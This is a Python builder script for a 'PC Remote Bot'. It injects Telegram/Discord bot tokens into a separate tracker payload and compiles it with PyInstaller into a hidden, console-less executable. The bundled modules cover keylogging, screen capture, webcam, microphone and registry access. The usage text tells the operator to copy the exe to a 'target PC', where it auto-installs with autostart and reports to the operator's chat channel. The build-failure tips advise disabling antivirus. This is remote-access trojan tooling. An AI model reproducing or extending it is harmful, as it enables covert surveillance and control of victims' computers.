"""
PC Remote Bot - Builder
=======================
Creates a configured standalone .exe file

Usage:
  python builder.py -p telegram --api TOKEN --chat CHAT_ID
  python builder.py -p discord --api TOKEN --channel CHANNEL_ID
  python builder.py -p both --api TG_TOKEN --chat CHAT_ID --dapi DC_TOKEN --channel CHANNEL_ID
  python builder.py -p telegram --api TOKEN --chat ID -s linux
  python builder.py -p telegram --api TOKEN --chat ID -s windows --name MyBot

Examples:
  python builder.py -p telegram --api 123456:ABC --chat 987654321
  python builder.py -p both --api TG_TOKEN --chat ID --dapi DC_TOKEN --channel 123456
"""

import argparse
import os
import sys
import subprocess
import shutil

# ===== COLORS FOR TERMINAL =====
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def log_ok(msg):   print(f"{GREEN}[OK]{RESET} {msg}")
def log_fail(msg): print(f"{RED}[FAIL]{RESET} {msg}")
def log_info(msg): print(f"{BLUE}[*]{RESET} {msg}")
def log_warn(msg): print(f"{YELLOW}[!]{RESET} {msg}")

# ===== PARSE ARGS =====
parser = argparse.ArgumentParser(
    description="PC Remote Bot Builder - Creates configured exe",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-p", "--platform", choices=["telegram","discord","both"], default="telegram",
    help="Platform:\n  telegram - Telegram bot\n  discord  - Discord bot\n  both     - Both simultaneously")
parser.add_argument("--api",     help="Telegram Bot Token (or Discord token if -p discord)", default=None)
parser.add_argument("--chat",    help="Telegram Chat ID", default=None)
parser.add_argument("--dapi",    help="Discord Bot Token (only for -p both)", default=None)
parser.add_argument("--channel", help="Discord Channel ID", default=None)
parser.add_argument("-s", "--system", choices=["windows","linux"], default="windows",
    help="Target OS:\n  windows - Windows exe\n  linux   - Linux binary")
parser.add_argument("--name",    help="Output exe name (default: PCRemoteBot)", default="PCRemoteBot")
parser.add_argument("--icon",    help="Path to .ico file for exe icon", default=None)
parser.add_argument("--no-install", action="store_true", help="Disable self-installer in exe")
args = parser.parse_args()

# ===== VALIDATE =====
print()
print(f"{BOLD}{'='*50}{RESET}")
print(f"{BOLD}  PC Remote Bot Builder{RESET}")
print(f"{BOLD}{'='*50}{RESET}")
print()

if args.platform in ("telegram","both") and not args.api:
    log_fail("Telegram token required: --api YOUR_TOKEN"); sys.exit(1)
if args.platform in ("telegram","both") and not args.chat:
    log_fail("Telegram chat ID required: --chat YOUR_CHAT_ID"); sys.exit(1)
if args.platform == "discord" and not args.api:
    log_fail("Discord token required: --api YOUR_TOKEN"); sys.exit(1)
if args.platform in ("discord","both") and not args.channel:
    log_fail("Discord channel ID required: --channel YOUR_CHANNEL_ID"); sys.exit(1)
if args.platform == "both" and not args.dapi:
    log_fail("Discord token required for both mode: --dapi YOUR_DISCORD_TOKEN"); sys.exit(1)

log_info(f"Platform : {args.platform.upper()}")
log_info(f"System   : {args.system.upper()}")
log_info(f"Output   : {args.name}.exe")
print()

# ===== CHECK PYINSTALLER =====
log_info("Checking PyInstaller...")
result = subprocess.run(["pyinstaller", "--version"], capture_output=True, text=True)
if result.returncode != 0:
    log_warn("PyInstaller not found. Installing...")
    subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
    log_ok("PyInstaller installed!")
else:
    log_ok(f"PyInstaller found: {result.stdout.strip()}")

# ===== CHECK TRACKER.PY EXISTS =====
tracker_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.py")
if not os.path.exists(tracker_path):
    log_fail("tracker.py not found in same folder as builder.py!")
    sys.exit(1)
log_ok("tracker.py found!")

# ===== CREATE CONFIGURED SCRIPT =====
log_info("Creating configured script...")

# Read original tracker.py
with open(tracker_path, "r", encoding="utf-8") as f:
    original_code = f.read()

# Build config injection
telegram_token = args.api   if args.platform in ("telegram","both") else ""
chat_id        = args.chat  if args.platform in ("telegram","both") else ""
discord_token  = args.dapi  if args.platform == "both" else (args.api if args.platform == "discord" else "")
channel_id     = args.channel if args.platform in ("discord","both") else ""
no_install_flag = "True" if args.no_install else "False"

config_injection = f'''
# ===== AUTO-CONFIGURED BY BUILDER =====
import sys as _sys

# Inject args before argparse runs
_BUILDER_PLATFORM = "{args.platform}"
_BUILDER_SYSTEM   = "{args.system}"
_BUILDER_TG_TOKEN = "{telegram_token}"
_BUILDER_CHAT_ID  = "{chat_id}"
_BUILDER_DC_TOKEN = "{discord_token}"
_BUILDER_CHANNEL  = "{channel_id}"
_BUILDER_NO_INSTALL = {no_install_flag}
_BILDERR_EXE_NAME = "{args.name}"

# Override sys.argv so argparse gets the right values
_injected_argv = ["tracker.py", "-p", _BUILDER_PLATFORM, "-s", _BUILDER_SYSTEM]
if _BUILDER_TG_TOKEN: _injected_argv += ["--api", _BUILDER_TG_TOKEN]
if _BUILDER_CHAT_ID:  _injected_argv += ["--chat", _BUILDER_CHAT_ID]
if _BUILDER_DC_TOKEN: _injected_argv += ["--dapi", _BUILDER_DC_TOKEN]
if _BUILDER_CHANNEL:  _injected_argv += ["--channel", _BUILDER_CHANNEL]
if _BUILDER_NO_INSTALL: _injected_argv += ["--no-install"]
_sys.argv = _injected_argv
# ===== END AUTO-CONFIG =====

'''

# Inject config at the top of the script (after docstring if exists)
lines = original_code.split('\n')
insert_pos = 0

# Skip docstring if present
if lines[0].startswith('"""'):
    for i, line in enumerate(lines):
        if i > 0 and '"""' in line:
            insert_pos = i + 1
            break
else:
    insert_pos = 0

lines.insert(insert_pos, config_injection)
configured_code = '\n'.join(lines)

# Write configured script
configured_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"{args.name}_configured.py")
with open(configured_path, "w", encoding="utf-8") as f:
    f.write(configured_code)

log_ok(f"Configured script created: {args.name}_configured.py")

# ===== BUILD EXE =====
log_info("Building exe (this may take 2-5 minutes)...")
print()

# Check for alarm.wav
alarm_flag = ""
alarm_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "alarm.wav")
if os.path.exists(alarm_path):
    alarm_flag = f'--add-data "alarm.wav{os.pathsep}."'
    log_ok("alarm.wav found - including in build")
else:
    log_warn("alarm.wav not found - skipping")

# Check for icon
icon_flag = ""
# ✅ Auto detect icon.ico in same folder
icon_path = args.icon if args.icon else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "icon.ico"
)

if os.path.exists(icon_path):
    # ✅ Verify it's actually an ico file
    if not icon_path.lower().endswith('.ico'):
        log_warn("Icon must be .ico format! Converting...")
        try:
            from PIL import Image
            img      = Image.open(icon_path)
            ico_path = icon_path.rsplit('.', 1)[0] + '.ico'
            img.save(ico_path, format='ICO', sizes=[
                (256,256),(128,128),(64,64),(32,32),(16,16)
            ])
            icon_flag = f'--icon "{os.path.abspath(ico_path)}"'
            log_ok(f"Converted to: {ico_path}")
        except Exception as e:
            log_warn(f"Conversion failed: {e}")
            icon_flag = ""
    else:
        icon_flag = f'--icon "{os.path.abspath(icon_path)}"'
        log_ok(f"Icon: {icon_path}")

# Build PyInstaller command
hidden_imports = [
    # System
    "pyttsx3", "pyttsx3.drivers", "pyttsx3.drivers.sapi5", "pyttsx3.drivers.dummy",
    "cv2", "psutil", "pyautogui", "screen_brightness_control",
    "screen_brightness_control.windows", "screen_brightness_control.linux",
    "pythoncom", "pywintypes", "win32api", "win32con", "win32gui",
    "win32process", "winreg", "winsound", "requests", "requests.adapters",
    "urllib3", "urllib3.util.retry", "PIL", "PIL.Image", "PIL.ImageGrab",
    "comtypes", "comtypes.client", "json", "socket", "http.server",
    "urllib.parse", "ctypes", "ctypes.wintypes", "threading", "subprocess",
    "platform", "tkinter", "pynput", "pynput.keyboard", "pyaudio", "wave",
    "asyncio",
    "asyncio.selector_events",
    "asyncio.windows_events",
    "discord",
    "discord.ext.commands",
    "discord.gateway",
    "discord.http",
    "discord.state",
    "discord.webhook",
    "discord.opus",
    "aiohttp",
    "aiohttp.resolver",
    "aiohttp.connector",
]

collect_all = [
    "pyttsx3", "pyautogui", "cv2",
    "comtypes", "pynput",
    "discord",
    "aiohttp",
]

cmd_parts = [
    "pyinstaller",
    "--onefile",
]

if args.system == "windows":
    cmd_parts += ["--noconsole", "--windowed"]

if args.system == "linux":
    cmd_parts += ["--noconsole"]

cmd_parts.append(f"--name {args.name}")

if alarm_flag:
    cmd_parts.append(alarm_flag)
if icon_flag:
    cmd_parts.extend(icon_flag.split(" ", 1))

# Windows only imports
windows_only = [
    "pythoncom", "pywintypes", "win32api", "win32con",
    "win32gui", "win32process", "winreg", "winsound",
    "comtypes", "comtypes.client",
    "asyncio.windows_events",
    "pyttsx3", "pyttsx3.drivers", "pyttsx3.drivers.sapi5",
    "screen_brightness_control.windows",
]

for imp in hidden_imports:
    # ✅ Skip Windows imports when building for Linux
    if args.system == "linux" and imp in windows_only:
        continue
    cmd_parts.append(f"--hidden-import={imp}")

for pkg in collect_all:
    cmd_parts.append(f"--collect-all {pkg}")

cmd_parts.append(f'"{configured_path}"')

cmd = " ".join(cmd_parts)

print(f"{BLUE}Running:{RESET} pyinstaller --onefile --noconsole --name {args.name} [+imports] {args.name}_configured.py")
print()

result = subprocess.run(cmd, shell=True)

# ===== CHECK RESULT =====
print()
output_exe = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "dist",
    f"{args.name}.exe" if args.system == "windows" else args.name
)

if os.path.exists(output_exe):
    size = os.path.getsize(output_exe)
    size_mb = size / 1024 / 1024

    log_ok(f"Build successful!")
    log_ok(f"Output: dist/{args.name}.exe")
    log_ok(f"Size  : {size_mb:.1f} MB")

    print()
    print(f"{BOLD}{'='*50}{RESET}")
    print(f"{BOLD}  Build Complete!{RESET}")
    print(f"{BOLD}{'='*50}{RESET}")
    print()
    print(f"  Exe    : dist/{args.name}.exe")
    print(f"  Config : Platform={args.platform.upper()}, OS={args.system.upper()}")
    print()
    print(f"  How to use:")
    print(f"  1. Copy dist/{args.name}.exe to target PC")
    print(f"  2. Double click {args.name}.exe")
    if not args.no_install:
        print(f"  3. It will auto-install and setup autostart")
        print(f"  4. Check Telegram/Discord for online message")
    else:
        print(f"  3. Bot starts immediately (no install)")
    print()

else:
    log_fail("Build failed!")
    print()
    print("  Common fixes:")
    print("  1. Run as Administrator")
    print("  2. Disable antivirus temporarily")
    print("  3. pip install pyinstaller --upgrade")
    print("  4. Check error above for details")
    print()

# ===== CLEANUP =====
log_info("Cleaning up temp files...")
try:
    os.remove(configured_path)
    shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "build"), ignore_errors=True)
    spec_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"{args.name}.spec")
    if os.path.exists(spec_file): os.remove(spec_file)
    log_ok("Cleanup done!")
except Exception as e:
    log_warn(f"Cleanup warning: {e}")

print()
input("Press Enter to exit...")
